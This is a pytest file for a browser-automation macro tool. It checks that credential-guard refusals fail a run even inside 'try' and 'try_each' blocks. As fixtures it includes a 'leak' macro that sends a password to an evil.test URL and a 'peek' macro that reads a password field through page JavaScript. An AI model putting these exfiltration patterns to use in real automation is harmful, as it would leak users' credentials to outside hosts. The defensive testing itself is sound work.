# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A credential refusal fails the run; a macro's ``try`` cannot catch it.

``try`` suppresses its body's errors and ``try_each`` moves on to the next
branch, and both did that for the credential guard's refusals too: a fill
refused on a foreign origin, a called macro's sink or page-code refusal. The
step never ran, but the run reported success, so nobody learned that a macro
had tried to send a credential somewhere it may not go -- and a ``try_each``
went on to run its next branch as if the first had merely missed a selector.
A refusal is a verdict on the macro, not a page that did not cooperate.
"""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock

import pytest

from octowright.credential_sinks import CredentialRefusal
from tests.test_macro_credential_fill_origin import SECRET, _session

pytestmark = pytest.mark.anyio

FOREIGN = "https://evil.example/login"
OWN = "https://app.example.test/"


async def _run(monkeypatch: pytest.MonkeyPatch, session: Any, macros: dict[str, list[dict[str, Any]]]) -> Any:
    from octowright.macros import execution

    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    return await execution.run_macro(session, "outer", {"password": SECRET, "email": "me@example.test"})


def _fill(value: str = "{{password}}") -> dict[str, Any]:
    return {"action": "fill", "selector": "#pw", "value": value}


async def test_a_fill_refused_inside_try_fails_the_run(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    session = _session(tmp_path, launch=OWN, current=FOREIGN)
    with pytest.raises(RuntimeError, match=r"evil\.example") as caught:
        await _run(monkeypatch, session, {"outer": [{"action": "try", "actions": [_fill()]}]})
    assert SECRET not in str(caught.value)
    session.fill.assert_not_awaited()


async def test_try_each_does_not_move_past_a_refusal(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    session = _session(tmp_path, launch=OWN, current=FOREIGN)
    second_branch = {"action": "press_key", "key": "Escape"}
    session.press_key = AsyncMock()
    with pytest.raises(RuntimeError, match=r"evil\.example"):
        await _run(
            monkeypatch,
            session,
            {"outer": [{"action": "try_each", "branches": [[_fill()], [second_branch]]}]},
        )
    session.press_key.assert_not_awaited()


async def test_a_called_macros_sink_refusal_inside_try_fails_the_run(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    session = _session(tmp_path, launch=OWN, current=OWN)
    macros = {
        "outer": [{"action": "try", "actions": [{"action": "macro_call", "name": "leak", "args": {"p": "{{password}}"}}]}],
        "leak": [{"action": "navigate", "url": "https://evil.test/?p={{p}}"}],
    }
    with pytest.raises(RuntimeError, match=r"navigation or code sink") as caught:
        await _run(monkeypatch, session, macros)
    assert SECRET not in str(caught.value)


async def test_a_called_macros_page_code_refusal_inside_try_fails_the_run(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    session = _session(tmp_path, launch=OWN, current=OWN)
    macros = {
        "outer": [_fill(), {"action": "try", "actions": [{"action": "macro_call", "name": "peek", "args": {}}]}],
        "peek": [{"action": "evaluate", "expression": "() => document.querySelector('#pw').value"}],
    }
    with pytest.raises(RuntimeError, match=r"page code"):
        await _run(monkeypatch, session, macros)


async def test_an_ordinary_failure_inside_try_is_still_suppressed(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    session = _session(tmp_path, launch=OWN, current=OWN)
    session.fill.side_effect = TimeoutError("no #pw")
    result = await _run(monkeypatch, session, {"outer": [{"action": "try", "actions": [_fill("{{email}}")]}]})
    assert result["skipped"] >= 1


def test_every_refusal_the_guard_raises_is_a_credential_refusal() -> None:
    from octowright.credential_sinks import credential_fill_refusal, page_code_refusal

    action = {"action": "fill", "_octowright_credential_args": ["password"]}
    assert isinstance(credential_fill_refusal(action, "https://evil.example"), CredentialRefusal)
    refusal = page_code_refusal({"action": "evaluate", "expression": "1"}, ["password"])
    assert isinstance(refusal, CredentialRefusal)
    # Still a ValueError, so every existing caller that catches one is unchanged.
    assert isinstance(refusal, ValueError)
